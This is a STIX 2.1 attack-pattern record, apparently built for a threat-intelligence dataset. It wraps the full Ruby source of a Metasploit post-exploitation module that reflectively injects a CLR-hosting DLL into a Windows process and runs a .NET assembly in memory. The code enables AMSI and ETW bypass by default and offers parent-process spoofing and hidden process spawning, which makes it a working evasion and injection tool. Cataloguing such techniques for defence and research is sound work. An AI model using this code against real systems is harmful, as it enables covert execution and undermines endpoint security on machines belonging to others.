{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--66411910-6591-44ae-a685-ef90e09590a7",
    "created": "2024-08-14T16:33:04.981222Z",
    "modified": "2024-08-14T16:33:04.981226Z",
    "name": "Execute .net Assembly (x64 only)",
    "description": " This module executes a .NET assembly in memory. It reflectively loads a dll that will host CLR, then it copies the assembly to be executed into memory. Credits for AMSI bypass to Rastamouse (@_RastaMouse)  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/windows/manage/execute_dotnet_assembly.rb",
            "external_id": "execute_dotnet_assembly.rb"
        },
        {
            "source_name": "References=>URL",
            "external_id": "https://b4rtik.github.io/posts/execute-assembly-via-meterpreter-session/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Post\n\n  include Msf::Post::File\n  include Msf::Exploit::Retry\n  include Msf::Post::Windows::Priv\n  include Msf::Post::Windows::Process\n  include Msf::Post::Windows::ReflectiveDLLInjection\n  include Msf::Post::Windows::Dotnet\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Execute .net Assembly (x64 only)',\n        'Description' => %q{\n          This module executes a .NET assembly in memory. It\n          reflectively loads a dll that will host CLR, then it copies\n          the assembly to be executed into memory. Credits for AMSI\n          bypass to Rastamouse (@_RastaMouse)\n        },\n        'License' => MSF_LICENSE,\n        'Author' => 'b4rtik',\n        'Arch' => [ARCH_X64],\n        'Platform' => 'win',\n        'SessionTypes' => ['meterpreter'],\n        'Targets' => [['Windows x64', { 'Arch' => ARCH_X64 }]],\n        'References' => [['URL', 'https://b4rtik.github.io/posts/execute-assembly-via-meterpreter-session/']],\n        'DefaultTarget' => 0,\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              stdapi_sys_process_attach\n              stdapi_sys_process_execute\n              stdapi_sys_process_get_processes\n              stdapi_sys_process_getpid\n              stdapi_sys_process_kill\n              stdapi_sys_process_memory_allocate\n              stdapi_sys_process_memory_write\n              stdapi_sys_process_thread_create\n            ]\n          }\n        },\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'SideEffects' => [IOC_IN_LOGS],\n          'Reliability' => []\n        }\n      )\n    )\n    spawn_condition = ['TECHNIQUE', '==', 'SPAWN_AND_INJECT']\n    inject_condition = ['TECHNIQUE', '==', 'INJECT']\n\n    register_options(\n      [\n        OptEnum.new('TECHNIQUE', [true, 'Technique for executing assembly', 'SELF', ['SELF', 'INJECT', 'SPAWN_AND_INJECT']]),\n        OptPath.new('DOTNET_EXE', [true, 'Assembly file name']),\n        OptString.new('ARGUMENTS', [false, 'Command line arguments']),\n        OptBool.new('AMSIBYPASS', [true, 'Enable AMSI bypass', true]),\n        OptBool.new('ETWBYPASS', [true, 'Enable ETW bypass', true]),\n\n        OptString.new('PROCESS', [false, 'Process to spawn', 'notepad.exe'], conditions: spawn_condition),\n        OptBool.new('USETHREADTOKEN', [false, 'Spawn process using the current thread impersonation', true], conditions: spawn_condition),\n        OptInt.new('PPID', [false, 'Process Identifier for PPID spoofing when creating a new process (no PPID spoofing if unset)', nil], conditions: spawn_condition),\n\n        OptInt.new('PID', [false, 'PID to inject into', nil], conditions: inject_condition),\n      ], self.class\n    )\n\n    register_advanced_options(\n      [\n        OptBool.new('KILL', [true, 'Kill the launched process at the end of the task', true], conditions: spawn_condition)\n      ]\n    )\n\n    self.terminate_process = false\n    self.hprocess = nil\n    self.handles_to_close = []\n  end\n\n  def find_required_clr(exe_path)\n    filecontent = File.read(exe_path).bytes\n    sign = 'v4.0.30319'.bytes\n    filecontent.each_with_index do |_item, index|\n      sign.each_with_index do |subitem, indexsub|\n        break if subitem.to_s(16) != filecontent[index + indexsub].to_s(16)\n\n        if indexsub == 9\n          vprint_status('CLR version required: v4.0.30319')\n          return 'v4.0.30319'\n        end\n      end\n    end\n    vprint_status('CLR version required: v2.0.50727')\n    'v2.0.50727'\n  end\n\n  def check_requirements(clr_req, installed_dotnet_versions)\n    installed_dotnet_versions.each do |fi|\n      if clr_req == 'v4.0.30319'\n        if fi[0] == '4'\n          vprint_status('Requirements ok')\n          return true\n        end\n      elsif clr_req == 'v2.0.50727'\n        if fi[0] == '3' || fi[0] == '2'\n          vprint_status('Requirements ok')\n          return true\n        end\n      end\n    end\n    print_error('Required dotnet version not present')\n    false\n  end\n\n  def run\n    exe_path = datastore['DOTNET_EXE']\n\n    unless File.file?(exe_path)\n      fail_with(Failure::BadConfig, 'Assembly not found')\n    end\n    installed_dotnet_versions = get_dotnet_versions\n    vprint_status(\"Dot Net Versions installed on target: #{installed_dotnet_versions}\")\n    if installed_dotnet_versions == []\n      fail_with(Failure::BadConfig, 'Target has no .NET framework installed')\n    end\n    rclr = find_required_clr(exe_path)\n    if check_requirements(rclr, installed_dotnet_versions) == false\n      fail_with(Failure::BadConfig, 'CLR required for assembly not installed')\n    end\n\n    if sysinfo.nil?\n      fail_with(Failure::BadConfig, 'Session invalid')\n    else\n      print_status(\"Running module against #{sysinfo['Computer']}\")\n    end\n\n    execute_assembly(exe_path, rclr)\n  end\n\n  def cleanup\n    if terminate_process && !hprocess.nil? && !hprocess.pid.nil?\n      print_good(\"Killing process #{hprocess.pid}\")\n      begin\n        client.sys.process.kill(hprocess.pid)\n      rescue Rex::Post::Meterpreter::RequestError => e\n        print_warning(\"Error while terminating process: #{e}\")\n        print_warning('Process may already have terminated')\n      end\n    end\n\n    handles_to_close.each(&:close)\n  end\n\n  def sanitize_process_name(process_name)\n    if process_name.split(//).last(4).join.eql? '.exe'\n      out_process_name = process_name\n    else\n      \"#{process_name}.exe\"\n    end\n    out_process_name\n  end\n\n  def pid_exists(pid)\n    host_processes = client.sys.process.get_processes\n    if host_processes.empty?\n      print_bad('No running processes found on the target host.')\n      return false\n    end\n\n    theprocess = host_processes.find { |x| x['pid'] == pid }\n\n    !theprocess.nil?\n  end\n\n  def launch_process\n    if datastore['PROCESS'].nil?\n      fail_with(Failure::BadConfig, 'Spawn and inject selected, but no process was specified')\n    end\n\n    ppid_selected = datastore['PPID'] != 0 && !datastore['PPID'].nil?\n    if ppid_selected && !pid_exists(datastore['PPID'])\n      fail_with(Failure::BadConfig, \"Process #{datastore['PPID']} was not found\")\n    elsif ppid_selected\n      print_status(\"Spoofing PPID #{datastore['PPID']}\")\n    end\n\n    process_name = sanitize_process_name(datastore['PROCESS'])\n    print_status(\"Launching #{process_name} to host CLR...\")\n\n    begin\n      process = client.sys.process.execute(process_name, nil, {\n        'Channelized' => false,\n        'Hidden' => true,\n        'UseThreadToken' => !(!datastore['USETHREADTOKEN']),\n        'ParentPid' => datastore['PPID']\n      })\n      hprocess = client.sys.process.open(process.pid, PROCESS_ALL_ACCESS)\n    rescue Rex::Post::Meterpreter::RequestError => e\n      fail_with(Failure::BadConfig, \"Unable to launch process: #{e}\")\n    end\n\n    print_good(\"Process #{hprocess.pid} launched.\")\n    hprocess\n  end\n\n  def inject_hostclr_dll(process)\n    print_status(\"Reflectively injecting the Host DLL into #{process.pid}..\")\n\n    library_path = ::File.join(Msf::Config.data_directory, 'post', 'execute-dotnet-assembly', 'HostingCLRx64.dll')\n    library_path = ::File.expand_path(library_path)\n\n    print_status(\"Injecting Host into #{process.pid}...\")\n    # Memory management note: this memory is freed by the C++ code itself upon completion\n    # of the assembly\n    inject_dll_into_process(process, library_path)\n  end\n\n  def open_process(pid)\n    if (pid == 0) || pid.nil?\n      fail_with(Failure::BadConfig, 'Inject technique selected, but no PID set')\n    end\n\n    if pid_exists(pid)\n      print_status(\"Opening handle to process #{pid}...\")\n      begin\n        hprocess = client.sys.process.open(pid, PROCESS_ALL_ACCESS)\n      rescue Rex::Post::Meterpreter::RequestError => e\n        fail_with(Failure::BadConfig, \"Unable to access process #{pid}: #{e}\")\n      end\n      print_good('Handle opened')\n      hprocess\n    else\n      fail_with(Failure::BadConfig, 'PID not found')\n    end\n  end\n\n  def check_process_suitability(pid)\n    process = session.sys.process.each_process.find { |i| i['pid'] == pid }\n    if process.nil?\n      fail_with(Failure::BadConfig, 'PID not found')\n    end\n\n    arch = process['arch']\n\n    if arch != ARCH_X64\n      fail_with(Failure::BadConfig, 'execute_dotnet_assembly currently only supports x64 processes')\n    end\n  end\n\n  def execute_assembly(exe_path, clr_version)\n    if datastore['TECHNIQUE'] == 'SPAWN_AND_INJECT'\n      self.hprocess = launch_process\n      self.terminate_process = datastore['KILL']\n      check_process_suitability(hprocess.pid)\n    else\n      if datastore['TECHNIQUE'] == 'INJECT'\n        inject_pid = datastore['PID']\n      elsif datastore['TECHNIQUE'] == 'SELF'\n        inject_pid = client.sys.process.getpid\n      end\n      check_process_suitability(inject_pid)\n\n      self.hprocess = open_process(inject_pid)\n    end\n\n    handles_to_close.append(hprocess)\n\n    begin\n      exploit_mem, offset = inject_hostclr_dll(hprocess)\n\n      pipe_suffix = Rex::Text.rand_text_alphanumeric(8)\n      pipe_name = \"\\\\\\\\.\\\\pipe\\\\#{pipe_suffix}\"\n      appdomain_name = Rex::Text.rand_text_alpha(9)\n      vprint_status(\"Connecting with CLR via #{pipe_name}\")\n      vprint_status(\"Running in new AppDomain: #{appdomain_name}\")\n      assembly_mem = copy_assembly(pipe_name, appdomain_name, clr_version, exe_path, hprocess)\n    rescue Rex::Post::Meterpreter::RequestError => e\n      fail_with(Failure::PayloadFailed, \"Error while allocating memory: #{e}\")\n    end\n\n    print_status('Executing...')\n    begin\n      thread = hprocess.thread.create(exploit_mem + offset, assembly_mem)\n      handles_to_close.append(thread)\n\n      pipe = nil\n      retry_until_truthy(timeout: 15) do\n        pipe = client.fs.file.open(pipe_name)\n        true\n      rescue Rex::Post::Meterpreter::RequestError => e\n        if e.code != Msf::WindowsError::FILE_NOT_FOUND\n          # File not found is expected, since the pipe may not be set up yet.\n          # Any other error would be surprising.\n          vprint_error(\"Error while attaching to named pipe: #{e.inspect}\")\n        end\n        false\n      end\n\n      if pipe.nil?\n        fail_with(Failure::PayloadFailed, 'Unable to connect to output stream')\n      end\n\n      basename = File.basename(datastore['DOTNET_EXE'])\n      dir = Msf::Config.log_directory + File::SEPARATOR + 'dotnet'\n      unless Dir.exist?(dir)\n        Dir.mkdir(dir)\n      end\n      logfile = dir + File::SEPARATOR + \"log_#{basename}_#{Time.now.strftime('%Y%m%d%H%M%S')}\"\n      read_output(pipe, logfile)\n    # rubocop:disable Lint/RescueException\n    rescue Rex::Post::Meterpreter::RequestError => e\n      fail_with(Failure::PayloadFailed, e.message)\n    rescue ::Exception => e\n      # rubocop:enable Lint/RescueException\n      unless terminate_process\n        # We don't provide a trigger to the assembly to self-terminate, so it will continue on its merry way.\n        # Because named pipes don't have an infinite buffer, if too much additional output is provided by the\n        # assembly, it will block until we read it. So it could hang at an unpredictable location.\n        # Also, since we can't confidently clean up the memory of the DLL that may still be running, there\n        # will also be a memory leak.\n\n        reason = 'terminating due to exception'\n        if e.is_a?(::Interrupt)\n          reason = 'interrupted'\n        end\n\n        print_warning('****')\n        print_warning(\"Execution #{reason}. Assembly may still be running. However, as we are no longer retrieving output, it may block at an unpredictable location.\")\n        print_warning('****')\n      end\n\n      raise\n    end\n\n    print_good('Execution finished.')\n  end\n\n  def copy_assembly(pipe_name, appdomain_name, clr_version, exe_path, process)\n    print_status(\"Host injected. Copy assembly into #{process.pid}...\")\n    # Structure:\n    # - Packed metadata (string/data lengths, flags)\n    # - Pipe Name\n    # - Appdomain Name\n    # - CLR Version\n    # - Param data\n    # - Assembly data\n    assembly_size = File.size(exe_path)\n\n    cln_params = ''\n    cln_params << datastore['ARGUMENTS'] unless datastore['ARGUMENTS'].nil?\n    cln_params << \"\\x00\"\n\n    pipe_name = pipe_name.encode(::Encoding::ASCII_8BIT)\n    appdomain_name = appdomain_name.encode(::Encoding::ASCII_8BIT)\n    clr_version = clr_version.encode(::Encoding::ASCII_8BIT)\n    params = [\n      pipe_name.bytesize,\n      appdomain_name.bytesize,\n      clr_version.bytesize,\n      cln_params.length,\n      assembly_size,\n      datastore['AMSIBYPASS'] ? 1 : 0,\n      datastore['ETWBYPASS'] ? 1 : 0,\n    ].pack('IIIIICC')\n\n    payload = params\n    payload += pipe_name\n    payload += appdomain_name\n    payload += clr_version\n    payload += cln_params\n    payload += File.read(exe_path)\n\n    payload_size = payload.length\n\n    # Memory management note: this memory is freed by the C++ code itself upon completion\n    # of the assembly\n    allocated_memory = process.memory.allocate(payload_size, PROT_READ | PROT_WRITE)\n    process.memory.write(allocated_memory, payload)\n    print_status('Assembly copied.')\n    allocated_memory\n  end\n\n  def read_output(pipe, logfilename)\n    print_status('Start reading output')\n\n    print_status(\"Writing output to #{logfilename}\")\n    logfile = File.open(logfilename, 'wb')\n\n    begin\n      loop do\n        output = pipe.read(1024)\n        if !output.nil? && !output.empty?\n          print(output)\n          logfile.write(output)\n        end\n        break if output.nil? || output.empty?\n      end\n    rescue ::StandardError => e\n      print_error(\"Exception: #{e.inspect}\")\n    end\n\n    logfile.close\n    print_status('End output.')\n  end\n\n  attr_accessor :terminate_process, :hprocess, :handles_to_close\nend\n",
    "x_mitre_platforms": [
        "win'"
    ]
}